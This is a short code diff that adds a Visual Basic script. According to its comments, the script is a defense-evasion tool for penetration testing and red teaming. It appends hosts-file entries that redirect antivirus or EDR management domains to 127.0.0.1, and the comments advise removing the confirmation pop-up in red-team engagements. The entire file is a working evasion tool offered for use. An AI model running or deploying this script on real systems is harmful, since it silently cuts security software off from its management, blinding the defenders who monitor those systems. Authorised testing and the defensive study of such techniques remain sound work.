@@ -1,0 +1,59 @@
+Option Explicit
+
+Public Module Module1
+
+    'Defense evasion via sinkhole of AV/EDR traffic as a part of penetration testing or purple teaming. 
+    'Works by creating a hostfile entry for example.com mapping to 127.0.0.1 
+    'Change Example.com to the URLs the target AV uses to communicate with management.  
+    'Either run multiple times or modify script if multiple URLs need to be blocked.  
+    'For testing we have an informational pop-up, but remove this for red teaming engagements.
+    'Validate host file entries via CMD:  type %WINDIR%\System32\drivers\etc\hosts  
+
+    Sub Main
+        
+        Dim sHostFile As String
+        Dim sAvURL As String
+        Dim sRedirectIP As String
+
+        ' Equivalent of @SystemDir
+        ' Typically c:\Windows\System32
+        sHostFile = Environ("SystemRoot") & "\System32\drivers\etc\hosts"
+
+        ' The domain to block
+        sAvURL = "Example.com"
+        ' The redirect IP
+        sRedirectIP = "127.0.0.1"
+
+        ' Create the file if it doesn't exist
+        If Dir(sHostFile) = "" Then
+            ' Just open it for Output, then close immediately to create an empty file
+            Dim tempFile As Integer
+            tempFile = FreeFile
+            Open sHostFile For Output As #tempFile
+            Close #tempFile
+        End If
+
+        ' Open the hosts file in append mode
+        Dim fileNum As Integer
+        fileNum = FreeFile
+        On Error Resume Next
+        Open sHostFile For Append As #fileNum
+        If Err.Number <> 0 Then
+            MsgBox "Unable to open hosts file: " & sHostFile, vbSystemModal, "Error"
+            Exit Sub
+        End If
+        On Error GoTo 0
+
+        ' Write the redirect lines
+        Print #fileNum, sRedirectIP & " " & sAvURL
+        Print #fileNum, sRedirectIP & " " & "www." & sAvURL
+
+        ' Close the file
+        Close #fileNum
+
+        ' Confirm success
+        MsgBox "Hosts file updated to redirect " & sAvURL & " to 127.0.0.1", vbSystemModal, "Success"
+
+    End Sub
+    
+End Module
